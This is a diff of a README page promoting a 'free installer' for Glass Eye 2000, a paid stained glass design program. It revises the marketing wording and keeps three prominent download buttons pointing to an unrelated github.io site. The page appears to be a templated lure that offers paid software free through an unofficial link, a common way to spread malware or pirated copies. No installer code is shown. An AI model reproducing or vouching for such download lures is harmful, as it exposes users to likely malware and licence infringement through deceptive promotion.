@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-Stained+Glass-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-Stained+Glass+Design-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Glass Eye 2000 Free Installer** — Glass Eye 2000 is a Windows stained glass design software that simulates the appearance of stained glass artwork. Works without internet access, no account required. Full offline installation.
+**💻 Glass Eye 2000 Free Installer** — Glass Eye 2000 is a specialized Windows software for designing stained glass patterns. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Glass Eye 2000](https://img.shields.io/badge/⬇_Install_Glass%20Eye%202000-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Glass Eye 2000](https://img.shields.io/badge/⬇_Install_Glass+Eye+2000-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Glass Eye 2000
 
-Glass Eye 2000 is a Windows stained glass design software that simulates the appearance of stained glass artwork. Artists and hobbyists use it to plan and design stained glass projects with accurate color simulation, pattern tracing, and materials estimation.
+Glass Eye 2000 is a specialized Windows software for designing stained glass patterns. Create, edit, and print full-scale patterns for stained glass art projects. Features include a shape library, color simulation, pattern resizing, and material cost estimation. Used by professional stained glass artists and hobbyists for planning and designing glass art pieces.
 
 ---
 
 ## ❌ Problem: Glass Eye 2000 is hard to access
 
-- **Windows Only** — No macOS or Linux version available
-- **Very Niche Audience** — Specifically for stained glass artists and hobbyists
-- **Paid License** — Requires purchase
-- **Dated Interface** — UI design reflects older Windows application conventions
+- **Windows Only** — No macOS version
+- **Specialized Audience** — Designed exclusively for stained glass artists
+- **Older Software** — Development has slowed with limited new feature additions
+- **Learning Curve** — Specialized domain knowledge of stained glass required
 
 ---
 
@@ -81,7 +81,7 @@ Glass Eye 2000 is a Windows stained glass design software that simulates the app
 
 <div align="center">
 
-[![⬇ Install Glass Eye 2000](https://img.shields.io/badge/⬇_Install_Glass%20Eye%202000-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Glass Eye 2000](https://img.shields.io/badge/⬇_Install_Glass+Eye+2000-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Glass Eye 2000 is a Windows stained glass design software that simulates the app
 
 ---
 
-**Glass Eye 2000 Free Installer** — Glass Eye 2000 is a Windows stained glass design software that simulates the appearance of stained glass artwork. Install without internet connection today!
+**Glass Eye 2000 Free Installer** — Glass Eye 2000 is a specialized Windows software for designing stained glass patterns. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Glass Eye 2000](https://img.shields.io/badge/⬇_Install_Glass%20Eye%202000-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Glass Eye 2000](https://img.shields.io/badge/⬇_Install_Glass+Eye+2000-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
